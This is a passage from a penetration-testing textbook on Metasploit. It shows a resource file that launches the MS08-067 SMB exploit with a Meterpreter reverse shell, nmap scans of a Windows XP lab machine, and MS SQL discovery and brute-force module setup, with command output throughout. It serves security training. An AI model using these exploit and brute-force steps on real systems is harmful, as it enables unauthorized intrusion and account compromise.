src="Metasploit_ The Penetration Tester&#39;s Guide/Image_217.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: left;">As you can see at <span class="s32">O </span>and <span class="s32">8</span>, the <span class="s25">version </span>and <span class="s25">load sounds </span>commands are echoed into a text file called <span class="s19">resource.rc</span>. This file is then passed to <span class="s19">msfconsole </span>at the command line at <span class="s32">@ </span>with the <span class="s25">-r </span>switch, and when the file begins to load, the commands are executed at <span class="s32">O </span>from the resource file.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">A more complex resource file might automatically run a particular exploit against a machine in your lab environment. For example, the following listing uses an SMB exploit in a newly created resource file called <span class="s19">autoexploit.rc</span>. We set a payload and our attack and target IPs in this one file so that we don’t have to specify these options manually when attempting this exploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_218.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3/ <span class="s24">echo use exploit/windows/smb/ms08_067_netapi &gt; autoexploit.rc </span>root@bt:/opt/framework3/msf3/ <span class="s24">echo set RHOST 192.168.1.155 &gt;&gt; autoexploit.rc </span>root@bt:/opt/framework3/msf3/ <span class="s24">echo set PAYLOAD windows/meterpreter/reverse_tcp &gt;&gt; autoexploit.rc </span>root@bt:/opt/framework3/msf3/ <span class="s24">echo set LHOST 192.168.1.101 &gt;&gt; autoexploit.rc </span>root@bt:/opt/framework3/msf3/ <span class="s24">echo exploit &gt;&gt; autoexploit.rc</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3/ <span class="s24">msfconsole</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf &gt; <span class="s24">resource autoexploit.rc</span></p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 80%;text-align: left;">resource (autoexploit.rc)<span class="s30">O</span>&gt; use exploit/windows/smb/ms08_067_netapi resource (autoexploit.rc)&gt; set RHOST 192.168.1.155</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (autoexploit.rc)&gt; set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (autoexploit.rc)&gt; set LHOST 192.168.1.101 LHOST =&gt; 192.168.1.101</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (autoexploit.rc)&gt; exploit</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.1.101:4444 [*] Triggering the vulnerability...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (747008 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1033)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_219.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">Here we specify the resource file within <span class="s19">msfconsole</span>, and it automatically runs our specified commands as shown by the output displayed at <span class="s32">O</span>.</p><p class="s22" style="padding-top: 6pt;padding-left: 42pt;text-indent: 0pt;text-align: center;">NOTE     <span class="s19">These are just a couple of simple examples. In Chapter 12, you will learn how to use</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">karma<span class="s19">, a very large resource file.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark175">Wrapping Up</a><a name="bookmark192">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">You’ve just exploited your first machine and gained full access to it with</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msfconsole<span class="p">. Congratulations!</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We began this chapter by covering the basics of exploitation and com- promising a target based on a discovered vulnerability. Exploitation is about identifying a system’s potential exposures and exploiting its weaknesses. We used <span class="s19">nmap </span>to identify potentially vulnerable services. From there we launched an exploit that gave us access to a system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the next chapter, we will explore Meterpreter in more detail as we learn how to use it in post exploitation. You will find Meterpreter to be an amazing tool once you’ve compromised a system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 231pt;text-indent: 0pt;text-align: left;"><span><img width="67" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_220.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 182pt;text-indent: 0pt;text-align: left;"><a name="bookmark193">ME TERP RE TE R</a><a name="bookmark220">&zwnj;</a><a name="bookmark221">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In this chapter, we’ll dive deeper into this “hacker’s Swiss army knife” that can significantly improve your post exploitation experience. Meterpreter is one of the flagship products in Metasploit and is leveraged as a payload after a vulnerability is exploited. A <span class="s38">payload </span>is the information returned to us when we trigger an</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">exploit. For example, when we exploit a weakness in a Remote Procedure Call (RPC), trigger the exploit, and select Meterpreter as the payload, we would be given a Meterpreter shell to the system. Meterpreter is an extension of the Metasploit Framework that allows us to leverage Metasploit’s function- ality and further compromise our target. Some of this functionality includes ways to cover your tracks, reside purely in memory, dump hashes, access operating systems, pivot, and much more.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this chapter, we’ll leverage normal attack methods within Metasploit to compromise a Windows XP machine. Our payload, Meterpreter, will allow us to perform additional attacks after we’ve compromised the system.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark194">Compromising a Windows XP Virtual Machine</a><a name="bookmark222">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Before we dive into the specifics of Meterpreter, we first need to compromise a system and get a Meterpreter shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark195">Scanning for Ports with Nmap</a><a name="bookmark223">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We begin by identifying the services and ports running on the target by con- ducting a port scan with <span class="s19">nmap </span>to find a port to exploit, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_221.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf &gt; <span class="s24">nmap -sT -A -P0 192.168.33.130 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] exec: nmap -sT -A -P0 192.168.33.130</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP. . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:87.9992pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PORT</p></td><td style="width:30pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">STATE</p></td><td style="width:45pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">SERVICE</p></td><td style="width:150pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">VERSION</p></td></tr><tr style="height:11pt"><td style="width:34pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">21/tcp</p></td><td style="width:30pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">open</p></td><td style="width:45pt"><p class="s43" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ftp</p></td><td style="width:150pt"><p class="s43" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft ftpd <span class="s33">O</span></p></td></tr><tr style="height:11pt"><td style="width:34pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">25/tcp</p></td><td style="width:30pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">open</p></td><td style="width:45pt"><p class="s43" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">smtp</p></td><td style="width:150pt"><p class="s43" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft ESMTP 6.0.2600.2180 <span class="s33">@</span></p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80/tcp</p></td><td style="width:30pt"><p class="s28" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">open</p></td><td style="width:45pt"><p class="s43" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">http</p></td><td style="width:150pt"><p class="s43" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Microsoft IIS webserver 5.1 <span class="s33">0</span></p></td></tr></table><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">|_html-title: Directory Listing Denied</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">1433/tcp open <span class="s24">ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM </span><span class="s30">8</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6646/tcp open unknown</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">MAC Address: 00:0C:29:EA:26:7C (VMware)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Device type: general purpose Running: Microsoft Windows XP|2003</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: left;">OS details: Microsoft Windows XP Professional SP2 <span class="s30">@ </span>or Windows Server 2003</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 37.58 seconds</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_222.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 78%;text-align: left;">After conducting our port scan at <span class="s32">O</span>, we see that some interesting ports are accessible, including MS SQL at <span class="s32">8</span>, a potential attack vector. But perhaps the most interesting thing that <span class="s19">nmap </span>tells us is that this machine is running Windows XP Service Pack 2 at <span class="s32">@</span>, which is now at the end of life, which means some published vulnerabilities will not have been fixed or patched by the</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">installation of SP3.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">Also of note, we see the standard FTP <span class="s32">O </span>and SMTP <span class="s32">@ </span>ports, which might be available to be leveraged for an attack. And we see that port 80 <span class="s32">0 </span>is open, which means we have a potential web application to attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark196">Attacking MS SQL</a><a name="bookmark224">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In this example, we’ll attack port 1433, MS SQL, because this is often an entry point of weakness that can lead to a complete compromise and full administrative-level control over the target.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To begin, we identify the MS SQL installation, and then launch a MS SQL Server brute force attack to see if we can guess a password. By default, MS SQL is installed on TCP port 1433 and UDP port 1434, though newer versions allow for installation on a dynamically allocated port, which can be random- ized. Luckily, port 1434 UDP (for which we did not scan) remains the same and can be queried to identify the dynamic port of the SQL server.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Here, we scan the system and see that MS SQL port 1434 UDP is open:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_223.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">nmap -sU 192.168.33.130 –p1434 </span><span class="s30">O</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap scan report for 192.168.33.130 Host is up (0.00033s latency).</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PORT STATE SERVICE</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 14pt;text-align: left;">1434/udp open ms-sql-m <span class="s30">8</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_224.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">As you can see, we scan our host at <span class="s32">O </span>and see that MS SQL UDP port 1434 at <span class="s32">8 </span>is open. (Chapters 11, 13, and 17 will cover MS SQL in much more depth.)</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">When targeting MS SQL, we can leverage the <span class="s19">mssql_ping </span>module to brute</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">force the MS SQL port and attempt to guess the username and password. When MS SQL is first installed, the program will require the user to create an <span class="s19">sa</span>, or system administrator, account. You’ll often be able to guess or brute force the <span class="s19">sa </span>account password, because when administrators install this appli- cation they do not understand the security ramifications of using either a blank password or something too simple.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the next example, we look for the <span class="s19">mssql_ping </span>module and attempt to brute force the <span class="s19">sa </span>account:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_225.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use scanner/mssql/mssql_ping</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:37pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 11pt;text-align: left;">PASSWORD RHOSTS THREADS</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 20pt;text-indent: 0pt;line-height: 11pt;text-align: left;">no yes yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The password for the specified username</p><p class="s28" style="text-indent: 0pt;line-height: 11pt;text-align: left;">The target address range or CIDR identifier</p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:10pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">USERNAME</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">sa</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The username to authenticate as</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">set RHOSTS 192.168.33.1/24</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.33.1/24</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">set THREADS 20</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 20</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(mssql_ping) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 040 of 256 hosts (015% complete)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 052 of 256 hosts (020% complete)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 080 of 256 hosts (031% complete)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 115 of 256 hosts (044% complete)</p><p class="s25" style="padding-top: 1pt;padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">[*] SQL Server information for 192.168.33.130: <span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] ServerName = IHAZSECURITY <span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] InstanceName = SQLEXPRESS</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] IsClustered = No</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">[*] Version = 9.00.1399.06 <span class="s30">@</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] tcp = 1433 <span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] np = \\IHAZSECURITY\pipe\MSSQL$SQLEXPRESS\sql\query</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Scanned 129 of 256 hosts (050% complete)</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_226.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;line-height: 90%;text-align: justify;">After calling the <span class="s19">mssql_ping </span>module with <span class="s25">use scanner/mssql/mssql_ping </span>and setting our options, we see that a SQL Server installation is found at 192.168.33.130 <span class="s32">O</span>. The name of the server is <span class="s25">IHAZSECURITY </span><span class="s32">8</span>. Its version</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">number 9.00.1399.06 shown at <span class="s32">@ </span>equates to SQL Server 2005 Express, and</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 15pt;text-align: justify;">we know that it’s listening on TCP port 1433 <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark197">Brute Forcing MS SQL Server</a><a name="bookmark225">&zwnj;</a></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Next, we brute force the server with the Framework’s <span class="s19">mssql_login </span>module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_227.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf &gt; <span class="s24">use scanner/mssql/mssql_login </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf auxiliary(mssql_login) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:77pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:77pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">BRUTEFORCE_SPEED</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">5</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">How fast to bruteforce, from 0 to 5</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The password for the specified username</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">PASS_FILE</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">File containing passwords, one per line</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1433</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">THREADS</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of concurrent threads</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USERNAME</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">sa</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:186pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The username to authenticate as</p></td></tr><tr style="height:11pt"><td style="width:77pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">USERPASS_FILE</p></td><td style="width:63pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td 